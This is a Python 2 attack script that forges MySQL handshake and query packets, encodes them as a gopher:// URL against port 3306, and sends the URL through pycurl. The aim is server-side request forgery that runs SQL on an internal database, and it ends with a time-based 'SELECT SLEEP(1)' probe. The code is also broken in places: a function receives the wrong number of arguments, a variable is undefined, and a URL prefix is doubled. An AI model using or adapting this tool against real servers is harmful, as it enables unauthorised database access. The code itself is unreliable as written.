import pycurl, struct

def construct_handshake_response(user):
	connects_atrs_data = b''

	connect_attrs = {
		'_os': 'Linux',
		'_client_name': 'libmysql',
		'_pid': '1337',
		'_client_version': '5.7.29',
		'_platform': '_x86_64',
		'program_name': 'mysql'
	}

	for name, value in connect_attrs.items():
		connects_atrs_data += struct.pack('B', len(name)) + name    # len(CLIENT_CONNECT_ATTRS_name) + CLIENT_CONNECT_ATTRS_name
		connects_atrs_data += struct.pack('B', len(value)) + value  # len(CLIENT_CONNECT_ATTRS_value) + CLIENT_CONNECT_ATTRS_value

	connect_attrs_data = struct.pack('B', len(connects_atrs_data)) + connects_atrs_data # len(CLIENT_CONNECT_ATTRS)	+ CLIENT_CONNECT_ATTRS

	auth_response_packet = [
		0xa3 + len(user) - 4, 0x00, 0x00,                           # payload_length           int<3>
		0x01,                                                       # sequence_id              int<1>
		0x85, 0xa6, 0x3f, 0x20,                                     # capability_flags         int<4> SELECT * FROM performance_schema.session_connect_attrs WHERE processlist_id = CONNECTION_ID();
		0x00, 0x00, 0x00, 0x01,                                     # max_packet_size          int<4> 2 ** 24 -1
		0x08,                                                       # character_set            int<1>
		] + list(xrange(23)) + [                                    # reserved                 string[23]
		] + list(bytearray(user)) + [                               # username                 string[NUL]
		0x00,                                                       # length of auth-response  int<1>
		0x00,                                                       # auth-response            string[n]
		] + list(bytearray('mysql_native_password')) + [            # auth plugin name         string[NUL]
		0x00                                                        # [NUL]
		] + list(bytearray(connect_attrs_data))                     # client_connect_attrs                           

	return ''.join(map(lambda x: '{:02x}'.format(x), list(auth_response_packet)))

def encode(data):
	packet = 'gopher://0:3306/_'
	for i in range(len(data) / 2):
		packet += '%' + data[2*i:2*(i+1)]
	return unicode(packet)

def construct_query_packet(query):
	query = query.encode('hex')
	query_length = '{:x}'.format((len(query) / 2 ) + 1).rjust(2, '0')
	return encode(construct_handshake_response(db_user) + query_length + '00000003' + query + '0100000001') # COM_QUERY + len(query) + query

def send(packet):
	c = pycurl.Curl()

	c.setopt(c.URL, packet)
	c.setopt(c.TIMEOUT, 10)

	resp = c.perform_rs()
	c.close()

	return resp

print send('gopher://localhost:3306/_' + construct_query_packet('ssrf_user', 'SELECT SLEEP(1)'))